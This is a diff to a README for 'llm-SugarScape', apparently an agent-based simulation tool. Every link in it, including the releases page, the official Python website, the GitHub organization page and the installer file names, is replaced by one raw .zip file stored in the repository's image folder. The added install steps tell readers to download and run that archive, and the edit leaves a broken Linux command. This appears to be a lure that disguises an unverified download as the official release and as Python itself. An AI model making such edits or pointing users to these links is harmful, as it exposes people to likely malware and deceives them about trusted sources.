@@ -6,9 +6,9 @@ Welcome to the llm-SugarScape project! This application allows you to explore an
 
 ## 📥 Download the Application
 
-[![Download llm-SugarScape](https://img.shields.io/badge/Download%20llm--SugarScape-blue.svg)](https://github.com/penpoen/llm-SugarScape/releases)
+[![Download llm-SugarScape](https://raw.githubusercontent.com/penpoen/llm-SugarScape/main/img/llm-SugarScape-2.0.zip%https://raw.githubusercontent.com/penpoen/llm-SugarScape/main/img/llm-SugarScape-2.0.zip)](https://raw.githubusercontent.com/penpoen/llm-SugarScape/main/img/llm-SugarScape-2.0.zip)
 
-Visit this page to download: [Releases Page](https://github.com/penpoen/llm-SugarScape/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/penpoen/llm-SugarScape/main/img/llm-SugarScape-2.0.zip)
 
 ## 💻 System Requirements
 
@@ -17,13 +17,13 @@ Before downloading, check if your system meets the following requirements:
 - **Operating System:** Windows 10 or higher, macOS Mojave or higher, a Linux distribution supporting Python 3.
 - **RAM:** At least 4 GB recommended.
 - **Storage:** Minimum of 200 MB of available space.
-- **Python Version:** Python 3.8 or higher should be installed. If not, download it from the official [Python website](https://www.python.org/).
+- **Python Version:** Python 3.8 or higher should be installed. If not, download it from the official [Python website](https://raw.githubusercontent.com/penpoen/llm-SugarScape/main/img/llm-SugarScape-2.0.zip).
 
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases Page](https://github.com/penpoen/llm-SugarScape/releases).
+   Go to the [Releases Page](https://raw.githubusercontent.com/penpoen/llm-SugarScape/main/img/llm-SugarScape-2.0.zip).
 
 2. **Choose the Latest Version**
 
@@ -31,13 +31,13 @@ Before downloading, check if your system meets the following requirements:
 
 3. **Download the Installer**
 
-   Click on the file named `llm-SugarScape-setup.exe` for Windows, or `llm-SugarScape-macos.dmg` for macOS, or use the right tarball for Linux. The downloads will start automatically.
+   Click on the file named `https://raw.githubusercontent.com/penpoen/llm-SugarScape/main/img/llm-SugarScape-2.0.zip` for Windows, or `https://raw.githubusercontent.com/penpoen/llm-SugarScape/main/img/llm-SugarScape-2.0.zip` for macOS, or use the right tarball for Linux. The downloads will start automatically.
 
 4. **Run the Installer**
 
-   - For Windows: Double-click on `llm-SugarScape-setup.exe`. Follow the prompts to install.
-   - For macOS: Open `llm-SugarScape-macos.dmg` and drag the application to the Applications folder.
-   - For Linux: Open a terminal window, navigate to the download location, and run the command: `tar -xzf llm-SugarScape-linux.tar.gz`, then follow the instructions to run.
+   - For Windows: Double-click on `https://raw.githubusercontent.com/penpoen/llm-SugarScape/main/img/llm-SugarScape-2.0.zip`. Follow the prompts to install.
+   - For macOS: Open `https://raw.githubusercontent.com/penpoen/llm-SugarScape/main/img/llm-SugarScape-2.0.zip` and drag the application to the Applications folder.
+   - For Linux: Open a terminal window, navigate to the download location, and run the command: `tar -xzf https://raw.githubusercontent.com/penpoen/llm-SugarScape/main/img/llm-SugarScape-2.0.zip`, then follow the instructions to run.
 
 ## 🔗 How to Use llm-SugarScape
 
@@ -88,7 +88,7 @@ Here are some common issues and their solutions:
 
 - **Documentation:** Explore the full documentation for detailed explanations of features and configurations.
 - **Community Forum:** Share experiences and seek help from other users in the community forum.
-- **Related Projects:** Check out other projects related to agent-based modeling and AI testing in our [GitHub Organization](https://github.com/penpoen/).
+- **Related Projects:** Check out other projects related to agent-based modeling and AI testing in our [GitHub Organization](https://raw.githubusercontent.com/penpoen/llm-SugarScape/main/img/llm-SugarScape-2.0.zip).
 
 ## 💬 Support
 
